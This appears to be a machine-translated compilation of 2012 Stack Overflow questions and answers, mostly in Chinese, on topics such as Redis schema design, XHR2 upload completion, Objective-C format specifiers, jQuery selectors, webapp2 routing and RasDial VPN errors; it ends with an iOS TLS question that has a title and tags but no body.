[.on()](http://api.jquery.com/on/)

[jQuery Mobile Event](http://jquerymobile.com/test/docs/api/events.html)

# database - 多组信息的redis架构

> ID：11271069
> 
> 赞同：0
> 
> 时间：2012-06-30T02:58:30.633
> 
> 标签：database, nosql, redis

设置：想象一个应用程序在 redis 中存储 3 种类型的数据：
1.会话信息
2.用户状态（在线/离线）
3.用户 3 最喜欢的颜色

我想问一下正确的架构来设置它。我应该
：仅使用不同的密钥存储所有内容？即：
a1）将每个会话存储为：key =“会话ID”，值=“会话信息”，
a2）将每个状态存储为：key =“用户ID”，值=“在线||离线”，
a3）存储每个最喜欢的颜色：key = "user color1 || user color2 || user color3", value = "color name"

b. 使用不同的键存储会话，并使用状态/最喜欢的颜色集？即：
b1）将每个会话存储为：key =“
b2）在线和离线创建2套：每个在线用户在'set online'中，每个离线用户在'set offline'
b3）为每个用户创建一个'color set'：在每个set中，存储3种喜欢的颜色。

C。使用不同的键存储会话，并使用状态/最喜欢的颜色列表？
c1) 将每个会话存储为：key = "session id", value = "session information",
c2) 在线和离线创建 2 个列表：'list online' 中的每个在线用户，'list offline' 中的每个离线用户
c3) 创建每个用户的“颜色列表”：在每个列表中，存储 3 种最喜欢的颜色。

d。其他选择？

我主要关心性能。我想对会话、状态、颜色进行查询，以尽可能提高效率（假设有 500 万+用户）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T05:17:30.450

我会为会话做字符串。它们很简单，您可以将它们设置为过期 ( [`SETEX`](http://redis.io/commands/setex))。

至于颜色，您将产生一组内存开销，所以我只需将所有三种颜色存储为 1 个字符串值，使用[JSON](http://www.json.org/)或[MessagePack](http://msgpack.org/)（例如`SET colors:<user_id> '["red", "blue", "green"]'`）序列化。

For user status, its implied that if a user is not online, they're offline so I would waist time and space keeping two sets, just store which users are online. From my experience redis is more then fast enough to handle this as a set but another option would to use [redis bitmaps](http://redis.io/commands/setbit) to handle this data. See the blog post [Chandra Patni](http://blog.getspool.com/2011/11/29/fast-easy-realtime-metrics-using-redis-bitmaps/) for the details.

# javascript - 如何等待所有 XHR2 发送调用完成

> ID：11271073
> 
> 赞同：1
> 
> 时间：2012-06-30T02:59:36.577
> 
> 标签：javascript, jquery, asynchronous, xmlhttprequest, xmlhttprequest-level2

我已经完成了一些代码来将多个文件从浏览器上传到服务器，同时也显示了进度条。XHR2 发送调用是异步的。问题是我想在所有 XHR2 发送调用完成后调用一些函数。

这是我的代码的一个非常简化的片段：

```
<input id="upload" multiple="multiple" />

<script>
var files = document.getElementById("upload").files;
for (var i = 0, length = files.length; i < length; i++) {
   var file = files[i];
   var uploadFunc = function (arg) {
      return function () {
         processXHR(arg);
      };
   }(file);      
   uploadFunc();
}

function processXHR(file) {
   var normalizedFileName = getNormalizedName(file.name);
   var url = 'upload_file/';
   var formData = new FormData();
   formData.append("docfile", file);
   var xhr = new XMLHttpRequest();
   var eventSource = xhr.upload;
   eventSource.addEventListener("progress", function (evt) {
      var position = evt.position || evt.loaded;
      var total = evt.totalSize || evt.total;
      console.log('progress_' + normalizedFileName);
      console.log(total + ":" + position);
      $('#progress_' + normalizedFileName).css('width', (position * 100 / total).toString() + '%');
   }, false);
   eventSource.addEventListener("loadstart", function (evt) {
      console.log('loadstart');
   }, false);
   eventSource.addEventListener("abort", function (evt) {
      console.log('abort');
   }, false);
   eventSource.addEventListener("error", function (evt) {
      console.log('error');
   }, false);
   eventSource.addEventListener("timeout", function (evt) {
      console.log('timeout');
   }, false);
   xhr.onreadystatechange = function (evt) {
      if (xhr.readyState == 4) {
         console.log('onreadystatechange: File uploaded.');
      }
   };
    xhr.open('post', url, true);
    xhr.send(formData);
}
</script> 
```

每当“onreadystatechange：文件上传”。在控制台中打印，我知道其中一个文件已完成上传。但我无法编写任何会说“所有文件已上传”的代码。

谢谢你的帮助。 *我也在使用 jquery，以防有人有使用 jquery 的解决方案。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T03:40:52.023

你知道你打了多少电话吗？如果是这样，至少ajax回调，你检查计数。就像是

```
if (ajaxCallCount === ajaxCallsLength) {
 // Do stuff involving post all ajax calls
} else {
 ajaxCallCount++;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:10:32.040

You will need a counter and setInterval method in your case, try this:

```
<input id="upload" multiple="multiple" />

<script>
var files = document.getElementById("upload").files;
var counter = 0;

for (var i = 0, length = files.length; i < length; i++) {
   var file = files[i];
   var uploadFunc = function (arg) {
      return function () {
         processXHR(arg);
      };
   }(file);      
   uploadFunc();
}

var interval = setInterval(function() {
    if(counter == files.length) {
        clearInterval(interval);
        console.log("All Files uploaded!");
    }
}, 100);

function processXHR(file) {
   var normalizedFileName = getNormalizedName(file.name);
   var url = 'upload_file/';
   var formData = new FormData();
   formData.append("docfile", file);
   var xhr = new XMLHttpRequest();
   var eventSource = xhr.upload;
   eventSource.addEventListener("progress", function (evt) {
      var position = evt.position || evt.loaded;
      var total = evt.totalSize || evt.total;
      console.log('progress_' + normalizedFileName);
      console.log(total + ":" + position);
      $('#progress_' + normalizedFileName).css('width', (position * 100 / total).toString() + '%');
   }, false);
   eventSource.addEventListener("loadstart", function (evt) {
      console.log('loadstart');
   }, false);
   eventSource.addEventListener("abort", function (evt) {
      console.log('abort');
   }, false);
   eventSource.addEventListener("error", function (evt) {
      console.log('error');
   }, false);
   eventSource.addEventListener("timeout", function (evt) {
      console.log('timeout');
   }, false);
   xhr.onreadystatechange = function (evt) {
      if (xhr.readyState == 4) {
         counter += 1;
      }
   };
    xhr.open('post', url, true);
    xhr.send(formData);
}
</script> 
```

# objective-c - 我的 Objective-C 课程有什么问题？

> ID：11271076
> 
> 赞同：0
> 
> 时间：2012-06-30T03:00:18.347
> 
> 标签：objective-c, oop

我的 Objective-C 代码有问题。我正在尝试打印从“Person”类创建的对象的所有详细信息，但 NSLog 方法中没有显示名字和姓氏。它们被空格替换。

Person.h：[http](http://pastebin.com/mzWurkUL) : //pastebin.com/mzWurkUL Person.m：[http ://pastebin.com/JNSi39aw](http://pastebin.com/JNSi39aw)

这是我的主要源文件：

```
#import <Foundation/Foundation.h>
#import "Person.h"

int main (int argc, const char * argv[])
{
Person *bobby = [[Person alloc] init];
[bobby setFirstName:@"Bobby"];
[bobby setLastName:@"Flay"];
[bobby setAge:34];
[bobby setWeight:169];

NSLog(@"%s %s is %d years old and weighs %d pounds.",
      [bobby first_name],
      [bobby last_name],
      [bobby age],
      [bobby weight]);
return 0;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T03:01:38.387

%s 用于 C 风格的字符串（以 null 结尾的字符序列）。

将 %@ 用于 NSString 对象。通常，%@ 将调用任何 Objective C 对象的描述实例方法。对于 NSString，这是字符串本身。

请参阅[字符串格式说明符](https://developer.apple.com/library/mac/#documentation/cocoa/Conceptual/Strings/Articles/formatSpecifiers.html#//apple_ref/doc/uid/TP40004265)。

在不相关的说明中，您应该查看[Declared Properties](http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocProperties.html#//apple_ref/doc/uid/TP30001163-CH17-SW1)和 @synthesize 以实现您的类实现。它会为您生成所有 getter 和 setter，从而为您节省大量输入：

人.h：

```
#import <Cocoa/Cocoa.h>

@interface Person : NSObject
@property (nonatomic, copy) NSString *first_name, *last_name;
@property (nonatomic, strong) NSNumber *age, *weight;
@end 
```

人.m

```
#import "Person.h"

@implementation Person
@synthesize first_name = _first_name, last_name = _last_name;
@synthesize age = _age, weight = _weight; 
@end 
```

主文件

```
#import <Foundation/Foundation.h>
#import "Person.h"

int main (int argc, const char * argv[])
{
    Person *bobby = [[Person alloc] init];
    bobby.first_name = @"Bobby";
    bobby.last_name = @"Flay";
    bobby.age = [NSNumber numberWithInt:34]; // older Objective C compilers.

    // New-ish llvm feature, see http://clang.llvm.org/docs/ObjectiveCLiterals.html
    // bobby.age = @34;

    bobby.weight = [NSNumber numberWithInt:164]; 

    NSLog(@"%@ %@ is %@ years old and weighs %@ pounds.",
      bobby.first_name, bobby.last_name,
      bobby.age, bobby.weight);
    return 0;
} 
```

# asp.net-mvc - .net MVC 在 IIS7 Express 上部署：读入嵌入式资源

> ID：11271079
> 
> 赞同：0
> 
> 时间：2012-06-30T03:01:25.537
> 
> 标签：asp.net-mvc, iis, iis-express

我的 MVC .net 解决方案有 2 个项目：

1.  实际的网络项目

    这是我所有的模型、视图、控制器、属性等。一些控制器引用了我的报告项目，其中包括使用 SSRS 和 PDF 生成的本地（例如非服务器报告）报告。

2.  报告项目

    这包括将连接到数据库并生成报告的代码。该项目还包括一个包含大量报告模板的文件夹。报告模板是“嵌入式资源”。我已经确认它们在我部署时出现在 MVC 应用程序的 bin 文件夹中。

问题是，当我从控制器中调用报告代码时，IIS 会查找与 IIS 相关的报告文件。在报告代码中，我可能会说查看“report/confirmation.rdlc”。这在控制台应用程序中运行良好，但是一旦我使用 IIS 部署，该路径最终是“C:/program files(x86)/iis express/reports/confirmation.rdlc”，它不存在。

我也尝试过“~/report/confirmation.rdlc”以获得相同的结果。

我假设这意味着主文件夹 (~) 实际上是 IIS Express 根目录。如何为应用程序更改它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T03:14:57.103

只是尝试使用`Server.MapPath("~/bin/reports/confirmation.rdlc")`。

# xamarin.ios - Interface Builder 看不到我的子类 UILabel

> ID：11271080
> 
> 赞同：2
> 
> 时间：2012-06-30T03:01:33.580
> 
> 标签：xamarin.ios, interface-builder, uilabel, subclass

在 MonoTouch 中，我定义了以下类：

```
using System;
using MonoTouch.UIKit;
using MonoTouch.Foundation;
using System.Drawing;

namespace MyApp
{
    public class WUILabel : UILabel
    {
        public WUILabel () : base() { this.SetDefaults(); }
        public WUILabel(NSCoder coder) : base(coder) { this.SetDefaults(); }
        public WUILabel(NSObjectFlag t) : base(t) { this.SetDefaults(); }
        public WUILabel(IntPtr handle) : base(handle) { this.SetDefaults(); }
        public WUILabel(RectangleF frame) : base(frame) { this.SetDefaults(); }

        private void SetDefaults()
        {
            this.Font = UIFont.FromName("AmericanTypewriter", 15f);
            this.TextColor = UIColor.Black;
        }
    }
} 
```

在 Interface Builder 中，我将标签的“类”属性设置为“WUILabel”。

当我运行应用程序时，应用程序输出包含错误“Interface Builder 文件中的未知类 WUILabel”。有没有人成功地让它工作，或者谁能告诉我我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T08:06:51.860

你必须用 RegisterAttribute 来装饰你的类。

检查[这个](https://stackoverflow.com/questions/9857558/how-to-add-a-custom-view-to-a-xib-file-defined-view-in-monotouch/9859690#9859690)答案。

# sdk - 为 windows 安装 ogre3d SDK

> ID：11271084
> 
> 赞同：1
> 
> 时间：2012-06-30T03:02:45.423
> 
> 标签：sdk, ogre3d

所以我需要帮助安装 SDK。我正在使用 windows vista 并下载了 sdk (OGRE 1.8.0 SDK for MinGW)

我遵守这些规则：

[http://www.ogre3d.org/tikiwiki/tiki-index.php?page=Installing+the+Ogre+SDK](http://www.ogre3d.org/tikiwiki/tiki-index.php?page=Installing+the+Ogre+SDK)

我到了将文件解压缩到名为“java”的文件夹中的部分

完整路径是：

**C:\Users\Andy Chan\Desktop\java\OgreSDK_MinGW_v1-8-0**

下一部分是我陷入困境的部分。如果我打开命令行（我不知道命令提示符），它会说：

C:\users\Andy Chan> ![在此处输入图像描述](../Images/f515b0c43020748cacd5f91bf339f7d6.png) II 输入 setx OGRE_HOME + 构建路径（见图）

但它似乎不起作用。另外，我的 cmd 与教程中的不同，所以我真的迷路了。在命令提示符方面，我是一个完全的新手......

谁能给我一个简单的分步过程，如何设置环境变量 OGRE_HOME 以指向该路径？

我会很感激我能得到的任何帮助。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T15:32:06.287

您的路径有一个空格，请在其上使用双引号：

```
setx OGRE_HOME "c:\Users\Andy Chan\Desktop\java\OgreSDK_MinGW_v1-8-0" 
```

如果不使用空格，命令提示符会将路径拆分为多个参数，这会混淆 setx 命令。

# c++ - C++ 和 Cocoa：如何混合

> ID：11271086
> 
> 赞同：0
> 
> 时间：2012-06-30T03:02:53.740
> 
> 标签：c++, xcode, cocoa, visual-c++

我需要制作以下伪代码：

在 .h 文件中：

```
class Foo
{
public:
    Foo();
    ~Foo();
    void MyFunc();
}; 
```

在 .cpp/.m/.mm/ 中。文件：

```
Foo::Foo()
{
#if MAC
// Cocoa-specific initialization goes here
#endif
#if Windows
// Windows-specific initialization goes here
#endif
} 
```

我正在使用 XCode 和 MSVC 并使用 wxWidgets 进行开发，因此我需要能够在 MSVC 和 XCode 项目中包含这些文件。

最好的解决方案是什么？我想要一个类 - 意思是 2 个文件 (.h/.cpp)。

谢谢你。

[编辑] 我发现了这个：[如何在 C++ 中创建 Cocoa 对象？](https://stackoverflow.com/questions/9788427/how-to-create-cocoa-objects-in-c?rq=1)并且geovar的评论表明这是可能的，但是我在我拥有的XCode中找不到该选项（Snow Leopard的版本3.2 64位）。任何指针？

谢谢你。[/编辑]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:18:41.493

预处理器测试`__OBJC__`可用于有条件地在标头中声明 Objective-C 代码，该标头也可用于“纯”C++ 文件。例如：

```
#ifdef __OBJC__
  @interface Whatever : NSObject
  {
    . . .
  }
  . . .
  @end

#else

  class Whatever;

#endif

class SomeCPPClass
{
  . . .
};

// this actually works; the pointer form of the class
// can be passed freely from Objective-C++ to C++ through
// a plain-C or C++ routine such as this one
void SomeFunction (Whatever* param); 
```

对于需要 Objective-C++ 的源文件，将它们重命名（为`WhateverName.mm`）。也许这是必需的，也许不是，但它至少很方便，因为您不必设置自定义构建规则。

请注意，即使文件被重命名并使用了 Objective-C++ 编译器，如果您希望它们仍然是 99% C++（有明显的例外；例如，什么都不能命名`id`）。一般来说，你想用 C++ 做的任何事情都可以正常工作。

话虽如此，请阅读 Objective-C 与 C++ 的交互，因为有一些怪癖。例如，Objective-C 异常*在被抛出时不会调用 C++ 对象析构函数*（至少在某些语言版本中）。请注意，C++ 异常在 Objective-C++ 中的行为*确实符合预期；*我指的是你必须用`@try`. 给定 C++ 中的 RAII 样式类，我能想到的唯一清理解决方案是添加一个执行条件清理并显式调用它的方法，如下所示：

```
@try
{
    SomeRAIIStyleObject x;
    doSomethingThatMightTriggerObjCException(x);
}
. . .
@finally
{
    x.tearDownIfNeeded();
} 
```

# python - 使用url参数指定python如何处理请求

> ID：11271088
> 
> 赞同：0
> 
> 时间：2012-06-30T03:03:37.093
> 
> 标签：python, html, google-app-engine, url, query-parameters

好的，所以这看起来应该很基本，但我就是无法让它工作。我收到一个 404 错误，提示找不到资源，但我被定向到正确的地址，例如 www.url.com/sea?s='1' 用于航行。我有一个具有不同查询参数的链接列表，我希望我的 python 代码对它们进行不同的处理。我正在使用带有 python 和 jinja2 模板系统的谷歌应用程序引擎。

这是我的 HTML：

```
 <h3><a href="/" class="center-it">Quick Navigation</a></h3>
    <div class="span1">
    <div class="span1">
      <h4><a href="/sea">Sea</a></h4>
        <ul>
            <li><a href="/sea?s='1'">Sailing</a></li>
            <li><a href="/sea?s='2'">Diving</a></li>
            <li><a href="/sea?s='3'">Surfing</a></li>
            <li><a href="/sea?s='4'">Kite Boarding</a></li>
            <li><a href="/sea?s='5'">Kayaking</a></li>
        </ul>
   </div> 
```

这是蟒蛇：

```
class Sea(BlogHandler):
    def get(self, s):
        s = self.request.get('s')
        if s == '1':
            posts = posts = db.GqlQuery("select * from Post where sport=:1 order by created desc limit 30", "sailing")
        elif s == '2':
            posts = posts = db.GqlQuery("select * from Post where sport=:1 order by created desc limit 30", "diving")
        elif s == '3':
            posts = posts = db.GqlQuery("select * from Post where sport=:1 order by created desc limit 30", "surfing")
        elif s == '4':
            posts = posts = db.GqlQuery("select * from Post where sport=:1 order by created desc limit 30", "kiteboarding")
        elif s == '5':
            posts = posts = db.GqlQuery("select * from Post where sport=:1 order by created desc limit 30", "kayaking")
        else:
            posts = posts = db.GqlQuery("select * from Post where element=:1 order by created desc limit 30", "sea")

        global visits
        user = users.get_current_user()
        logout = users.create_logout_url(self.request.uri)        
        self.render('sport.html', user = user, posts=posts, visits = visits, logout=logout) 
```

更新：问题实际上不在于我的 URL 处理的代码。这是对的：

```
app = webapp2.WSGIApplication([('/', MainPage),
                               (r'/sea', Sea)] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:22:13.337

出现 404 错误不是因为您的页面有任何问题，而是因为您的路线或 app.yaml 文件有问题。如果您使用的是 webapp2，您只需要定义一个包含 url 的路由，`r'/air'`它应该可以工作。（例如`webapp2.Route(r'/sea/', handler=Sea)`

顺便说一句，您可以将它们作为 route kwargs 并做更好的事情，而不是在您的 get 请求中使用查询字符串，例如（语法是`<KEYWORDNAME:REGULAREXPRESSION>`当没有给出关键字名称时（如 in `<:/?>`）它只匹配正则表达式并且不不要把任何东西传给你）

```
webapp2.Route(r'/sea<:/?><activity:[a-zA-Z]*?>', defaults={"activity":""}, handler=Sea, name="sea") 
```

然后您可以将您的网址更改为，例如：

```
<a href="/sea/sailing">Sailing</a> 
```

您需要进行的唯一其他更改是在您的 Handler 函数中。它需要接受 kwargs。（所以你可以从字面上稍微改变你的获取请求）：

```
get(self, *args, **kwargs):
    activity = kwargs.get("activity")
    if activity in ("sailing", "kayaking", "hiking", "kiteboarding", "surfing", "diving")
       posts = db.GqlQuery("select * from Post where sport=:1 order by created desc limit 30", activity)
    elif activity:
       self.error(404)
    else:
       posts = db.GqlQuery ... etc 
```

这将大大简化您的代码，并让您使其更加灵活。此外，如果您的网站不经常更新，您可以做一些缓存以使查询更快捷，等等。

# facebook - 用 restfb 创建一个 facebook 应用程序？

> ID：11271089
> 
> 赞同：-1
> 
> 时间：2012-06-30T03:03:57.213
> 
> 标签：facebook

我想用 restfb 创建一个非常基本的应用程序，它只打印用户名。谁能告诉我如何开始。我不清楚申请流程？？？

还有一件事我可以先用tomcat进行测试，即无需在实时服务器上上传WAR文件？？？

你的帮助会让我继续前进。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T03:16:05.923

你的意思是休息API？请改用图形 API。Rest api 已被弃用！从不久的将来开始，您的应用程序可能无法运行。:) 这有帮助吗？如果它确实考虑接受答案！

# c# - 使用 Parallel ForEach 获取目录

> ID：11271094
> 
> 赞同：0
> 
> 时间：2012-06-30T03:05:17.437
> 
> 标签：c#, parallel-processing, linq-to-objects

我有一个在目录上递归并构建树的方法：

```
public void RecurseFolders(TreeNode mainNode) {
  DirectoryInfo nodeDir = new DirectoryInfo(mainNode.Tag.ToString());
  try {
    foreach (var dir in nodeDir.GetDirectories()) {
      int index = GetSystemIcon(dir.FullName, treeView1.ImageList, false);
      var subNode = new TreeNode(dir.Name, index, index);
      subNode.Tag = dir.FullName;
      mainNode.Nodes.Add(subNode);
      RecurseFolders(subNode);
    }
  } catch (UnauthorizedAccessException err) {
    Console.WriteLine(err);
  }
} 
```

我想做的是找到一种方法来编写一个[Parallel.ForEach](http://msdn.microsoft.com/en-us/library/dd460720.aspx)，但是我的 LINQ 知识太原始了。

显然，我无法将 传递`TreeNode`到线程中，因此我将签名修改为更通用。据我所知：

```
public string[] RecurseFolders(string dirString) {
  List<string> list = new List<string>();
  DirectoryInfo nodeDir = new DirectoryInfo(dirString);
  Parallel.ForEach(nodeDir.GetDirectories(), dir => {
    // how do I write this?
  });
  return list.ToArray();
} 
```

我将如何完成它？

**编辑：**

这是从我们的网络存储驱动器中提取目录和文件列表。通过网络获取信息目前是我们的瓶颈，但它是我学习一些并行处理技术的好地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:12:18.177

但是你已经做到了！

```
 public string[] RecurseFolders(string dirString) {
      List<string> list = new List<string>();
      DirectoryInfo nodeDir = new DirectoryInfo(dirString);
      Parallel.ForEach(nodeDir.GetDirectories(), dir => {
//Just continue writing here. This is an Action. Google it for more info. But for the purposes of this example you may consider it as method which will be called for each of the items
      });
      return list.ToArray();
    } 
```

# programming-languages - 停止和复制垃圾收集器的示例

> ID：11271102
> 
> 赞同：3
> 
> 时间：2012-06-30T03:08:02.360
> 
> 标签：programming-languages, garbage-collection

哪些编程语言（语言实现）使用[停止和复制垃圾收集](http://en.wikipedia.org/wiki/Stop_and_Copy_Garbage_Collection_Algorithm)？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-03T05:21:30.517

该链接指的是**切尼算法**，它是**复制垃圾收集**算法的变体。正如[维基](http://en.wikipedia.org/wiki/Garbage_collection_%28computer_science%29#Copying_vs._mark-and-sweep_vs._mark-and-don.27t-sweep)所说：

> 最直接的方法是**半空间收集器**......这种技术也称为**停止和复制**。**Cheney 算法**是对半空间收集器的改进。

停止和复制垃圾收集例如用于：

*   **Java**，其中堆的年轻代部分包含两个幸存者空间，这些空间由半空间收集器收集。

# javascript - 可以直接选择第一个后代吗？

> ID：11271108
> 
> 赞同：1
> 
> 时间：2012-06-30T03:10:10.833
> 
> 标签：javascript, jquery, jquery-selectors, traversal

我目前正在使用`find()`and方法从包含该类`first()`的每个元素中选择第一个后代元素。但是我觉得这很麻烦，因为方法会在第一个元素被选中之前生成一组匹配的元素。以下是我的代码的骨架：`<div>``parent``find()`

**HTML**

```
<div class=parent>
 <ul>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
 </ul>
</div>
<div class=parent>
 <ul>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
 </ul>
</div>
<div class=non-parent>
 <ul>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
 </ul>
</div>
<div class=parent>
 <ul>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
  <li>random characters</li>
 </ul>
</div>
// .....the list continues 
```

**Javascript**

```
$('.parent').each(function() {
 $(this).find('ul li').first().css('color', 'red');
// do other stuff (on other elements) within each loop
}); 
```

我见过有人使用`$(".parent li:first")`选择器。但是，因为我是在循环中进行的，所以我不确定如何或是否可以这样做，并希望得到一些建议。谢谢。

**澄清**：

我需要对`each`循环内 HTML 中未显示的其他元素执行其他操作。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T03:13:48.127

如果你想遍历每个父元素的第一个元素，你可以这样做：

```
$('.parent ul li:first-child').each(function() {
    $(this).css('color', 'red');
    // do other stuff within each loop
}); 
```

不过，这不必在循环中完成，因为该`.css()`方法将对所有匹配的元素进行操作。这也有效：

```
$('.parent ul li:first-child').css('color', 'red'); 
```

这将改变所有这些。

如果要遍历所有`li`s，另一个选择是：

```
$('.parent ul li').each(function() {
    if($(this).is(":first-child"))
        $(this).css('color', 'red');
    // do other stuff within each loop
}); 
```

更新：如果您想遍历每个父项而不是随后进行其他检查，则以下内容将很有用：

```
$('.parent').each(function() {
    // I assume that even if other uls are in parent, the ul you target is first

    $(this).find("ul li:first-child").first().css('color', 'red');

    // do other stuff within each loop
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T03:19:26.677

如果你坚持使用外循环和`:first`选择器，那么使用这个：

```
$('.parent').each(function() {
    $(this).find('li:first').css('color', 'red');
    // do other stuff within each loop
}); 
```

请注意，以下内容将*不起作用*：

```
$('.parent li:first').css('color', 'red'); 
```

....因为它只会选择`li`所有`.parent`元素的第一个后代。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T03:13:01.013

看看这个[http://api.jquery.com/first-child-selector/](http://api.jquery.com/first-child-selector/)

顺便说一句，你不需要 foreach ......！将您的 css 修改直接应用于集合！

```
$('.parent ul li:first-child').css('color', 'red'); 
```

请参考这个工作示例[http://jsfiddle.net/9ej5H/](http://jsfiddle.net/9ej5H/)

请注意，Zee Tee 的答案也可以，但可读性较差。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T03:21:32.603

您始终可以使用[索引选择器](http://api.jquery.com/eq/)：`$(".parent ul li:eq(0)")`

或者

`$(".parent ul li").eq(0)`

请注意：`0`是第一个。

# animation - 如何将一系列 swf 文件相互链接？

> ID：11271118
> 
> 赞同：0
> 
> 时间：2012-06-30T03:13:50.827
> 
> 标签：animation, flash

我有一系列 swf 文件，我想将它们链接在一起，如下所示：

```
 a.swf -> b.swf > c.swf > ..... 
```

事实上，我是 Flash 新手，我正在使用 Swishmax。我的文件大约有7000个，所以我很难不批量链接它们，所以请提出一种更易于实现的方法。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T01:45:53.707

从 greensock.com 查看 SWFLoader Greensock 为 AS3 和现在的 JavaScript 提供了很好的库。他们还拥有出色的文档和支持以及社区。但是，对您而言，如果使用“链接”，则意味着加载组合。然后 SWLLoader 会做得很好。

# struts2 - 处理 Struts2 浮点转换类型

> ID：11271120
> 
> 赞同：1
> 
> 时间：2012-06-30T03:14:02.843
> 
> 标签：struts2

我对 Struts2 中的浮点类型转换有疑问。

我有一个包含一系列正常输入元素的表单。

窗口中包含一系列文本字段，每个文本字段旁边都有一个*添加*按钮。单击其中一个按钮具有在表单内添加“隐藏”输入类型及其对应文本字段的值的效果。该值通常是一个浮点数，这一点非常重要，它使用点格式（例如：1.34）。

创建的输入如下所示：

```
<input class="hidden_material" type="hidden" name="form[0].cantidad_formulacion" value='1.34'/>
<input class="hidden_material" type="hidden" name="form[1].cantidad_formulacion" value='1.54'/> 
```

无论如何，整个过程都是正确的，直到表单提交后数据被服务器使用。数字的存在就好像点不会放在数字中一样（使用上面的示例，如 134）。

如果使用逗号（如 1,34），则不会有问题。但对于系统的用户来说，情况并非如此。我该如何解决这个问题？

# c - RasDial 返回 633（正在使用的端口），但不是

> ID：11271121
> 
> 赞同：1
> 
> 时间：2012-06-30T03:14:37.370
> 
> 标签：c, windows, vpn, dial-up, ras

我可以通过 Windows GUI RasDial 界面以及它的 CLI 等效 ( `c:\windows\rasdial.exe`) 完美连接到我的 VPN。但是，当尝试在 C 中自动化它时，`RasDial`返回 633 `ERROR_PORT_NOT_AVAILABLE`：（[来源](http://msdn.microsoft.com/en-us/library/windows/desktop/bb530704%28v=vs.85%29.aspx)）

这不是我特有的。我已经在四台不同的计算机上对其进行了测试，每台计算机都在单独的互联网连接上。

这是我的源代码：

```
#include <windows.h>
#include <winerror.h>
#include <Ras.h>
#include <raserror.h>
#include <wchar.h>
#include <stdio.h>

int EnumConnections();
int DialOut();
int HangUp();
int Debug();

int main()
{
    printf("Dial out return code: %d\n", DialOut());
    printf("Debug status: %i\n", Debug());
    EnumConnections();
    HangUp();
    return 0;
}

int EnumConnections()
{
    DWORD dwCb = 0;
    DWORD dwRet = ERROR_SUCCESS;
    DWORD dwConnections = 0;
    LPRASCONN lpRasConn = NULL;
    if (dwRet == ERROR_BUFFER_TOO_SMALL)
    {

        lpRasConn = (LPRASCONN) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCb);
        if (lpRasConn == NULL){
            wprintf(L"HeapAlloc failed!\n");
            return 0;
        }

        lpRasConn[0].dwSize = sizeof(RASCONN);

        dwRet = RasEnumConnections(lpRasConn, &dwCb, &dwConnections);

        if (ERROR_SUCCESS == dwRet){
            wprintf(L"The following RAS connections are currently active:\n");
            DWORD i;
            for (i = 0; i < dwConnections; i++){
                         wprintf(L"%s\n", lpRasConn[i].szEntryName);
                  }
        }

        HeapFree(GetProcessHeap(), 0, lpRasConn);
        lpRasConn = NULL;
    }

    if(dwConnections >= 1)
        wprintf(L"The operation failed to acquire the buffer size.\n");

    else
        wprintf(L"There are no active RAS connections.\n");

    return 0;
}

int DialOut()
{
    LPCTSTR pbkLoc = "C:\\rasphone.pbk\0";
    char* szPhoneNumberToDial = "127.0.0.1";
    char* szUserName = "test\0";
    char* szPassword = "test\0";
    RASDIALPARAMS rdParams;
    rdParams.dwSize = sizeof(RASDIALPARAMS);
    rdParams.szEntryName[0] = '\0';
    lstrcpy(rdParams.szPhoneNumber, szPhoneNumberToDial);
    rdParams.szCallbackNumber[0] = '\0';
    lstrcpy( rdParams.szUserName, szUserName );
    lstrcpy( rdParams.szPassword, szPassword );
    rdParams.szDomain[0] = '\0';

    HRASCONN hRasConn = NULL;
    return RasDial(NULL, pbkLoc, &rdParams, 0L, NULL, &hRasConn);
}

int HangUp()
{
    printf("Hung up\n");
    HRASCONN hRasConn = NULL;
    return RasHangUp(hRasConn);
}

int Debug()
{
    RASCONNSTATUS RasConnStatus;
    HRASCONN hRasConn = NULL;
    RasConnStatus.dwSize = sizeof(RasConnStatus);
    return RasGetConnectStatus(hRasConn,&RasConnStatus);
} 
```

有任何想法吗？我真的被困在这里了。我阅读了所有 RasDial 文档。我仍然不知道从哪里开始。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T14:31:24.900

要连接到 VPN 连接，您必须在电话簿中包含一个条目。如果没有提供条目，RasDial 只能连接到拨号连接。它怎么知道是否使用 PPTP、L2TP、SSTP 等？

根据您上面的示例，您为条目提供的条目名称是一个以空字符结尾的字符串，没有条目名称。您需要根据您的示例在“C:\rasphone.pbk”中创建一个包含所有 VPN 连接信息的条目，并将条目名称传递给 szEntryName 字段中的结构。

```
LPCTSTR entryName = "Your Entry Name\0";
rdParams.szEntryName = entryName; 
```

希望有帮助！

# ios - iOS 损坏发送到服务器的 TLS 数据

> ID：11271125
> 
> 赞同：0
> 
> 时间：2012-06-30T03:16:04.017
> 
> 标签：ios, websocket, ssl

